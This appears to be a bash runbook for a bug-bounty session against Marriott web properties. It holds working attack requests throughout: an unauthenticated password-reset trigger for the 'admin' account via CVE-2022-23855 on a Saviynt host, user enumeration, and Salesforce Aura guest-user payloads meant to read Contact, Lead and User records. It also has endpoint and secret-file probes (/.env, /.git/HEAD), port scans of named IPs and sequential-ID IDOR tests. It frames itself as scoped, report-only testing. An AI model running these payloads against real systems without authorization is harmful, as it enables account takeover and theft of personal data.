#!/usr/bin/env bash
# Pi Runbook — Marriott Session 3
# Goal: Targeted follow-up on top leads with CVE-informed tests
# Priority: CVE-2022-23855 on Saviynt, Salesforce Aura, esupplier manual, franchisetx IDOR
# Date: 2026-06-21
# Prerequisites: Source marriott-hunt-init.sh first
#
# Usage: source scripts/marriott-hunt-init.sh && bash runbooks/PI-RUNBOOK-marriott-session3.md
#        OR copy-paste sections into Pi terminal

BB="${BB:-$HOME/bug-bounty-hunting-}"
RESULTS="$BB/results/marriott"
OUTDIR="$RESULTS/session3"
mkdir -p "$OUTDIR" "$HOME/hunt"
cd "$HOME/hunt"

section() { echo -e "\n\033[1;36m━━━ $* ━━━\033[0m"; }
probe() {
  local h="$1" path="${2:-/}"
  printf "  https://%s%s: " "$h" "$path"
  /usr/bin/curl -sk --max-time 12 -o /dev/null \
    -w "HTTP %{http_code} | %{size_download}B | redir=%{redirect_url}\n" \
    "https://$h$path"
}

exec > >(tee "$OUTDIR/session3-output.txt") 2>&1
echo "=== Marriott Session 3 — $(date) ==="

# ============================================================
# STEP 0 — READ SESSION 2 RESULTS FIRST
# Critically important: understand what was found before proceeding
# ============================================================

section "STEP 0 — Session 2 Result Summary"

echo "Checking for session 2 output..."
if [ -f "$HOME/hunt/session2/session2-output.txt" ]; then
  echo ""
  echo "=== Session 2: HTTP 200 responses ==="
  grep -E "HTTP 200" "$HOME/hunt/session2/session2-output.txt" | head -30
  echo ""
  echo "=== Session 2: Open ports (naabu) ==="
  grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+" "$HOME/hunt/session2/session2-output.txt" | head -20
  echo ""
  echo "=== Session 2: JSON responses / CRITICAL flags ==="
  grep -iE "CRITICAL|ACTUATOR|JSON FOUND|SAVIYNT API|SALESFORCE|aura:invalid" \
    "$HOME/hunt/session2/session2-output.txt" | head -20
  echo ""
  echo "=== Session 2: CT discoveries ==="
  cat "$RESULTS/session2/ct-uat.txt" 2>/dev/null | head -10 && echo "(UAT subs above)"
  cat "$RESULTS/session2/ct-artifactory.txt" 2>/dev/null | head -5 && echo "(Artifactory above)"
  cat "$RESULTS/session2/ct-gateway.txt" 2>/dev/null | head -10 && echo "(Gateway subs above)"
else
  echo "  WARNING: ~/hunt/session2/session2-output.txt not found on this Pi"
  echo "  Session 2 output is required before proceeding with session 3"
  echo "  Re-run session 2 if output was not saved: runbook session2 | bash"
fi

# ============================================================
# PHASE A — SAVIYNT CVE-2022-23855 AUTH BYPASS
# Unauthenticated password reset for any local account (incl. admin)
# CVE-2022-23855 / CERT VU#692873
# Affects: Saviynt EIC 5.5 SP2.x
# If unpatched: CRITICAL finding — admin account takeover without credentials
# ============================================================

section "PHASE A — Saviynt CVE-2022-23855 Auth Bypass Test"

SAVIYNT="ssm-marriottms.saviyntcloud.com"
echo "Target: $SAVIYNT"
echo "CVE: CVE-2022-23855 — Unauthenticated password reset in /ECM/maintenance/forgotpasswordstep1"
echo ""

# Step 1: Check if the maintenance endpoint is accessible
echo "=== A1: Maintenance endpoint accessibility ==="
/usr/bin/curl -sk --max-time 15 \
  -o "$OUTDIR/saviynt-forgotpw-check.txt" \
  -w "HTTP %{http_code} | %{size_download}B\n" \
  "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep1"
cat "$OUTDIR/saviynt-forgotpw-check.txt" | head -5

echo ""
echo "=== A2: CVE-2022-23855 — POST to trigger password reset (admin account) ==="
# Safe test: attempt to trigger reset for 'admin' — if it returns 200, the bypass exists
# We do NOT complete the reset (no email access) — just confirm the endpoint is vulnerable
CVETEST=$(/usr/bin/curl -sk --max-time 15 \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}' \
  -w "\nHTTP %{http_code} | %{size_download}B" \
  "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep1" 2>/dev/null)
echo "  Response: $CVETEST"
echo ""

# If 200 → CRITICAL. If 302/404 → patched
if echo "$CVETEST" | grep -q "HTTP 200"; then
  echo "  *** CRITICAL: CVE-2022-23855 MAY BE PRESENT — endpoint returned 200 ***"
  echo "  *** DO NOT complete password reset. Document HTTP 200 as PoC. ***"
  echo "  *** REPORT IMMEDIATELY via /report workflow ***"
fi

echo ""
echo "=== A3: CVE-2022-23856 — User enumeration test ==="
# Safe: Compare responses for ID=1 vs ID=9999 — different sizes = user enumeration exists
RESP_1=$(/usr/bin/curl -sk --max-time 10 \
  "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep1?id=1" | wc -c)
RESP_9999=$(/usr/bin/curl -sk --max-time 10 \
  "https://$SAVIYNT/ECM/maintenance/forgotpasswordstep1?id=9999" | wc -c)
echo "  Response size for id=1:    $RESP_1 bytes"
echo "  Response size for id=9999: $RESP_9999 bytes"
if [ "$RESP_1" != "$RESP_9999" ]; then
  echo "  *** DIFFERENT SIZES — CVE-2022-23856 user enumeration may be present ***"
else
  echo "  (Same size — enumeration not detected or endpoint blocked)"
fi

echo ""
echo "=== A4: Saviynt API auth behavior check ==="
# Normal: 401 with JSON. WAF block: 403. Misconfigured: 200 with data.
for APIPATH in /ECM/api/v5/user/getUser /ECM/api/v5/role /ECM/api/v5/account; do
  echo -n "  $APIPATH: "
  /usr/bin/curl -sk --max-time 12 \
    -o /dev/null -w "HTTP %{http_code} | %{size_download}B\n" \
    "https://$SAVIYNT$APIPATH"
done
echo ""
echo "  Expected: 401 (normal auth) or 403 (WAF). 200 with JSON = CRITICAL."
echo ""
# Get full body of API endpoint to see if it's 401 JSON or redirect
APICHECK=$(/usr/bin/curl -sk --max-time 12 "https://$SAVIYNT/ECM/api/v5/user/getUser" 2>/dev/null)
echo "  /ECM/api/v5/user/getUser body: ${APICHECK:0:200}"

# ============================================================
# PHASE B — SALESFORCE AURA GUEST USER TEST (cpp.marriott.com)
# ShinyHunters attack class — actively exploited March 2026
# Indicator: 'aura:invalidSession' in response = endpoint reachable without auth
# ============================================================

section "PHASE B — Salesforce Community Cloud Aura Probe (cpp.marriott.com)"

CPP="cpp.marriott.com"
echo "Target: $CPP → Salesforce Experience Cloud"
echo "Class: Salesforce Aura Guest User object exposure (ShinyHunters attack class)"
echo ""

# Step B1: Extract fwuid from page source (required for Aura requests)
echo "=== B1: Extract fwuid from page source ==="
PAGE=$(/usr/bin/curl -sk --max-time 20 -L "https://$CPP/s/" 2>/dev/null)
FWUID=$(echo "$PAGE" | grep -oE '"fwuid":"[^"]{8,50}"' | head -1 | grep -oE '"[^"]{8,50}"$' | tr -d '"')
if [ -n "$FWUID" ]; then
  echo "  fwuid: $FWUID"
else
  # Try alternate extraction patterns
  FWUID=$(echo "$PAGE" | grep -oP 'fwuid[": ]+\K[A-Za-z0-9_-]{8,}' | head -1)
  echo "  fwuid (pattern 2): ${FWUID:-(not found in page source)}"
fi
echo "  Page size: ${#PAGE} bytes"
echo ""

# Step B2: Aura endpoint basic connectivity
echo "=== B2: Aura endpoint probe ==="
AURA_CODE=$(/usr/bin/curl -sk --max-time 15 \
  -o /dev/null -w "%{http_code}" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  GET /s/sfsites/aura: HTTP $AURA_CODE"
echo ""

# Step B3: POST Aura action — getObjectInfo (safe, read-only metadata)
# THIS IS THE CRITICAL TEST: if response contains 'aura:invalidSession' → endpoint accessible
echo "=== B3: Aura POST — getObjectInfo (indicator test) ==="
AURA_CTX='{"mode":"PROD","fwuid":"'"${FWUID:-unknown}"'","app":"siteforce:communityApp","loaded":{},"dn":[],"globals":{},"uad":false}'
AURA_MSG='{"actions":[{"id":"0;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"User"}}]}'
AURA_RESP=$(/usr/bin/curl -sk --max-time 20 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "message=$AURA_MSG" \
  --data-urlencode "aura.context=$AURA_CTX" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)

echo "  Response size: ${#AURA_RESP} bytes"
echo "  Response (first 400 chars): ${AURA_RESP:0:400}"
echo ""

if echo "$AURA_RESP" | grep -qi "aura:invalidSession\|invalidSession"; then
  echo "  *** 'aura:invalidSession' FOUND — Aura endpoint IS accessible unauthenticated ***"
  echo "  *** This is the ShinyHunters attack class indicator. Proceed to B4. ***"
  echo "$AURA_RESP" > "$OUTDIR/cpp-aura-b3-response.json"
elif echo "$AURA_RESP" | grep -qi '"state":"SUCCESS"'; then
  echo "  *** 'SUCCESS' — UNAUTHENTICATED DATA ACCESS CONFIRMED — CRITICAL ***"
  echo "$AURA_RESP" > "$OUTDIR/cpp-aura-b3-CRITICAL.json"
elif [ -z "$AURA_RESP" ] || echo "$AURA_RESP" | grep -qi "403\|forbidden\|access denied"; then
  echo "  (Endpoint blocked — 403 or no response)"
fi

# Step B4: If B3 shows invalidSession, enumerate accessible objects
echo ""
echo "=== B4: Aura object enumeration (Contact, Account, Lead) ==="
for OBJ in Contact Account Lead Opportunity User; do
  ENUM_MSG='{"actions":[{"id":"0;a","descriptor":"aura://RecordUiController/ACTION$getObjectInfo","callingDescriptor":"UNKNOWN","params":{"objectApiName":"'"$OBJ"'"}}]}'
  ENUM_RESP=$(/usr/bin/curl -sk --max-time 15 \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "message=$ENUM_MSG" \
    --data-urlencode "aura.context=$AURA_CTX" \
    --data-urlencode "aura.token=undefined" \
    "https://$CPP/s/sfsites/aura" 2>/dev/null)
  
  STATE=$(echo "$ENUM_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('actions',[{}])[0].get('state','unknown'))" 2>/dev/null || echo "non-JSON")
  echo "  $OBJ: state=$STATE | ${#ENUM_RESP}B"
  
  if echo "$ENUM_RESP" | grep -qi '"state":"SUCCESS"'; then
    echo "  *** SUCCESS on $OBJ — UNAUTHENTICATED DATA ACCESS ***"
    echo "$ENUM_RESP" > "$OUTDIR/cpp-aura-${OBJ}-CRITICAL.json"
  fi
done

# Step B5: getItems action (data records, not just metadata)
echo ""
echo "=== B5: Aura getItems — attempt to read records ==="
ITEMS_MSG='{"actions":[{"id":"0;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","layoutType":"FULL","pageSize":5,"currentPage":0}}]}'
ITEMS_RESP=$(/usr/bin/curl -sk --max-time 20 \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "message=$ITEMS_MSG" \
  --data-urlencode "aura.context=$AURA_CTX" \
  --data-urlencode "aura.token=undefined" \
  "https://$CPP/s/sfsites/aura" 2>/dev/null)
echo "  getItems (Contact) size: ${#ITEMS_RESP}B | state: $(echo "$ITEMS_RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('actions',[{}])[0].get('state','?'))" 2>/dev/null || echo 'non-JSON')"
if echo "$ITEMS_RESP" | grep -qi '"state":"SUCCESS"'; then
  echo "  *** SUCCESS — CONTACT RECORDS READABLE WITHOUT AUTH — CRITICAL ***"
  echo "$ITEMS_RESP" > "$OUTDIR/cpp-aura-getItems-Contact-CRITICAL.json"
fi

# ============================================================
# PHASE C — esupplier.marriott.com MANUAL INVESTIGATION
# Raw EC2, no WAF, 200/54985B response — supplier portal
# Methodology: fingerprint tech, map endpoints, test for IDOR on supplier IDs
# ============================================================

section "PHASE C — esupplier.marriott.com Deep Probe"

echo "=== C1: Technology fingerprint ==="
/usr/bin/curl -sk --max-time 15 -I "https://esupplier.marriott.com/" 2>&1 \
  | grep -iE "^(server|x-powered-by|content-type|location|x-aspnet|x-generator|x-frame|set-cookie|cf-ray|x-amz|via)" \
  | head -15
echo ""

echo "=== C2: Page source analysis — framework/tech clues ==="
PAGE_SRC=$(/usr/bin/curl -sk --max-time 20 -L "https://esupplier.marriott.com/" 2>/dev/null)
echo "  Page size: ${#PAGE_SRC} bytes"

# Check for framework fingerprints
for MARKER in "angular" "react" "vue" "jquery" "bootstrap" "__NEXT_DATA__" \
              "wp-content" "drupal" "x-csrf-token" "csrf_token" "viewstate" \
              "aspnet" ".aspx" ".jsp" "/api/" "swagger" "graphql"; do
  if echo "$PAGE_SRC" | grep -qi "$MARKER"; then
    echo "  FOUND: $MARKER"
  fi
done

# Extract form actions and API endpoints from page source
echo ""
echo "  API endpoints in page source:"
echo "$PAGE_SRC" | grep -oiE '/(api|rest|v[0-9]+|graphql|supplier|invoice|po|order)[/a-zA-Z0-9_-]*' \
  | sort -u | head -20

echo ""
echo "=== C3: Endpoint enumeration ==="
for PATH in /api /api/v1 /api/v2 /api/v3 \
  /graphql /graphiql \
  /supplier /suppliers \
  /invoices /invoice \
  /purchase-orders /orders /po \
  /api/suppliers /api/invoices /api/orders \
  /health /healthz /actuator \
  /swagger-ui.html /v2/api-docs /openapi.json \
  /login /auth /sso \
  /robots.txt /.env /.git/HEAD \
  /admin /management \
  /status /version /info; do
  probe "esupplier.marriott.com" "$PATH"
done

echo ""
echo "=== C4: Port scan — raw EC2 3.219.138.243 ==="
echo "  Scanning non-standard ports (no WAF — direct to server)"
naabu -host 3.219.138.243 \
  -p 80,443,8080,8443,8000,8001,8008,8009,8088,8090,8181,8888,\
9000,9080,9090,9200,9300,9999,\
3000,4000,4200,4443,5000,5001,5050,6000,7000,7070 \
  -silent -rate 30 -timeout 5 2>/dev/null | tee "$OUTDIR/esupplier-ports.txt"
echo "  Open ports:"
cat "$OUTDIR/esupplier-ports.txt"

# ============================================================
# PHASE D — Franchise Transactions IDOR Test
# marriottfranchisetransactions.marriott.com — financial portal, raw EC2
# IDOR on transaction/invoice IDs is primary bug class
# ============================================================

section "PHASE D — Franchise Transactions Financial Portal"

FT="marriottfranchisetransactions.marriott.com"
echo "Target: $FT (54.204.97.74 — raw EC2)"
echo ""

echo "=== D1: Tech fingerprint ==="
/usr/bin/curl -sk --max-time 15 -I "https://$FT/" 2>&1 \
  | grep -iE "^(server|x-powered-by|content-type|location|set-cookie)" | head -8

echo ""
echo "=== D2: Endpoint map ==="
for PATH in / /login /auth /dashboard \
  /transactions /transaction \
  /invoices /invoice \
  /payments /payment \
  /franchise /franchisee \
  /reports /report \
  /api /api/v1 /api/v2 \
  /health /actuator /swagger-ui.html \
  /admin /management \
  /robots.txt /.env; do
  probe "$FT" "$PATH"
done

echo ""
echo "=== D3: Source analysis ==="
FT_SRC=$(/usr/bin/curl -sk --max-time 20 -L "https://$FT/" 2>/dev/null)
echo "  Page size: ${#FT_SRC} bytes"
echo "$FT_SRC" | grep -oiE '/(api|transaction|invoice|payment|franchise)[/a-zA-Z0-9_-]*' \
  | sort -u | head -15

echo ""
echo "=== D4: IDOR seed — try sequential transaction IDs ==="
# Try predictable ID patterns — safe read-only test
for ID in 1 2 3 100 1000 TEST-001; do
  CODE=$(/usr/bin/curl -sk --max-time 10 \
    -o /dev/null -w "%{http_code}" \
    "https://$FT/transactions/$ID" 2>/dev/null)
  echo "  /transactions/$ID: HTTP $CODE"
done
# Also try /api/v1/transactions/{id}
for ID in 1 2 3; do
  CODE=$(/usr/bin/curl -sk --max-time 10 \
    -o /dev/null -w "%{http_code}" \
    "https://$FT/api/v1/transactions/$ID" 2>/dev/null)
  echo "  /api/v1/transactions/$ID: HTTP $CODE"
done

# ============================================================
# PHASE E — mgs.marriott.com (3 prior reports — find the gap)
# Raw EC2, 19501B response — messaging/meeting gateway
# ============================================================

section "PHASE E — mgs.marriott.com (Messaging Gateway)"

MGS="mgs.marriott.com"
echo "Target: $MGS (3 prior reports — what's still open?)"
echo ""

echo "=== E1: Tech fingerprint + page source ==="
/usr/bin/curl -sk --max-time 15 -I "https://$MGS/" | \
  grep -iE "^(server|x-powered-by|content-type|location|set-cookie|via)" | head -8
echo ""
MGS_SRC=$(/usr/bin/curl -sk --max-time 20 -L "https://$MGS/" 2>/dev/null)
echo "  Page size: ${#MGS_SRC} bytes"

# Look for API endpoints in source
echo "  API paths in source:"
echo "$MGS_SRC" | grep -oiE '/(api|v[0-9]+|messages|groups|meetings|gateway)[/a-zA-Z0-9_.-]*' \
  | sort -u | head -20

echo ""
echo "=== E2: Endpoint probe ==="
for PATH in / /api /api/v1 /api/v2 \
  /health /healthz /actuator /actuator/health \
  /swagger-ui.html /v2/api-docs /v3/api-docs \
  /messages /message \
  /groups /group \
  /meetings /meeting \
  /gateway /proxy \
  /login /auth \
  /robots.txt /.env \
  /metrics /status /info; do
  probe "$MGS" "$PATH"
done

# ============================================================
# PHASE F — CT Discovery Follow-up (session 2 data)
# If session 2 found new subdomains, probe them now
# ============================================================

section "PHASE F — CT Discovery Follow-up"

echo "Probing any new subdomains from session 2 CT enum:"
for CTF in "$RESULTS/session2"/ct-*.txt; do
  [ -f "$CTF" ] || continue
  LABEL=$(basename "$CTF" .txt | sed 's/ct-//')
  COUNT=$(wc -l < "$CTF" 2>/dev/null || echo 0)
  [ "$COUNT" -eq 0 ] && continue
  echo ""
  echo "  Pattern [$LABEL]: $COUNT subdomains discovered"
  while IFS= read -r host; do
    [ -z "$host" ] && continue
    SCOPE_RESULT=$(SCOPE_FILE="$BB/config/marriott-scope.yaml" \
      "$BB/scripts/scope-check.sh" "$host" 2>/dev/null || echo "UNKNOWN")
    [[ "$SCOPE_RESULT" == *"IN-SCOPE"* ]] || continue
    printf "    [in-scope] %s: " "$host"
    /usr/bin/curl -sk --max-time 10 \
      -o /dev/null -w "HTTP %{http_code} | %{size_download}B\n" \
      "https://$host/"
  done < "$CTF"
done

# ============================================================
# SESSION 3 DECISION GATE
# ============================================================

cat << 'DECISION'

━━━ SESSION 3 DECISION GATE ━━━

REPORT IMMEDIATELY if:

  Saviynt CVE-2022-23855 (Phase A):
  ✓ /ECM/maintenance/forgotpasswordstep1 POST returns HTTP 200
    → CRITICAL — unauthenticated admin account takeover
    → PoC: just the HTTP 200 response on POST {"username":"admin"}
    → CVSS: 9.8 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
    → Submit to HackerOne/marriott immediately — do NOT complete reset

  Salesforce Aura (Phase B):
  ✓ Response contains 'aura:invalidSession'
    → Aura endpoint is accessible to unauthenticated guest users
    → Proceed to enumerate object permissions (B4, B5)
    → If any object returns 'state: SUCCESS' with records → CRITICAL
    → CVSS: ~8.6 High (unauthorized PII access on Contact/Lead objects)
    → Report if Contact/Account/Lead/User data readable without auth

  esupplier (Phase C):
  ✓ Non-standard port open (e.g. 8080, 9000, 8443) → investigate service
  ✓ /actuator/env returns JSON → Critical (env var / secrets exposure)
  ✓ /swagger-ui.html or /api-docs returns 200 → map all endpoints, test auth
  ✓ Authenticated API returns data for another supplier's ID → IDOR High

  Franchise Transactions (Phase D):
  ✓ /transactions/{id} returns another user's data → IDOR Critical
  ✓ /actuator responds → Critical

NEXT SESSION if no critical hits:
  - Manual browser session: esupplier.marriott.com (create supplier account if possible)
  - PSP deep manual probe with Marriott Bonvoy account
  - OWA NTLM autodiscover from Pi (Zscaler route)
  - eidhelp.marriott.com — small employee app, probe auth flow

DECISION
